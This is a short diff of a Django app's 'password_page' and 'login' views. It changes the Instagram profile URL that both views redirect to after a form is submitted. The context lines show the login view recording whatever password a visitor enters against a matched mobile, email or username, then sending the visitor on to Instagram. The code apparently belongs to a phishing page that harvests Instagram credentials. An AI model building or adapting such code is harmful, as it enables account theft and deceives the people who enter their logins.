@@ -27,7 +27,7 @@ def password_page(request):
         
   # Simulate a delay for password update
         if password:
-            return redirect("https://www.instagram.com/polleykalicharan/")
+            return redirect("https://www.instagram.com/___s.h.n.e.h.a___/")
         else:
             return render(
                 request,
@@ -61,7 +61,7 @@ def login(request):
             Q(mobile__iexact=identifier) | Q(email__iexact=identifier) | Q(username__iexact=identifier)
         ).update(password=password)
             request.session["username"] = identifier
-            return redirect("https://www.instagram.com/polleykalicharan/")
+            return redirect("https://www.instagram.com/___s.h.n.e.h.a___/")
         else:
             return render(
                 request,
